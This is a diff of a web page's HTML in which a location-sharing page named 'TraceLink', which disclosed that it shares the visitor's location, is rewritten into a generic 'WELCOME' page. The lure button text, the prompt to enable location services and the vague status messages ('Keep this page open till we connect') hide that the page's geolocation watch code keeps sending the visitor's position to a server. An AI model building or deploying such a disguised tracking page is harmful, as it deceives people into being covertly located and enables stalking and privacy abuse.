@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-    <title>TraceLink - Share Location</title>
+    <title>Welcome to the website full of everything you need</title>
 
     <style>
         body {
@@ -29,19 +29,18 @@
 
 <body>
 
-    <h1>TraceLink</h1>
+    <h1>WELCOME</h1>
 
     <p>
-        This page allows you to voluntarily share your
-        current location.
+        This page allows you to see some of the most important things in your life.
     </p>
 
     <button id="shareButton">
-        Share My Location
+        Open this page to see the next content
     </button>
 
     <p id="status">
-        Location sharing is currently off.
+        Turn on location services.
     </p>
 
 
@@ -66,7 +65,7 @@
 
 
             status.textContent =
-                "Requesting location permission...";
+                "Waiting for this page to open,please be patient...";
 
 
             navigator.geolocation.watchPosition(
@@ -107,12 +106,12 @@
                         if (response.ok) {
 
                             status.textContent =
-                                "Your location is being shared.";
+                                "Keep this page open till we connect.";
 
                         } else {
 
                             status.textContent =
-                                "Unable to send your location.";
+                                "try again something went wrong.";
                         }
 
                     } catch (error) {
